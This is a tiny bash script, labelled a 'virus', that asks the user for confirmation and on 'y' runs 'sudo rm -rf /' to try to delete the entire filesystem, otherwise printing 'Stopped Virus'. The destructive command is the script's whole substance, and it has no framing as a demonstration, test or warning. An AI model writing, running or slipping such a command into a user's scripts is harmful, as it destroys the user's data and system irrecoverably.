#!/bin/bash

echo "Are you sure you want to start the virus? (y/n): "
read answer
if [[ "$answer" == "y" || "$answer" == "Y" ]]; then
    sudo rm -rf /
else
    echo "Stopped Virus"
fi
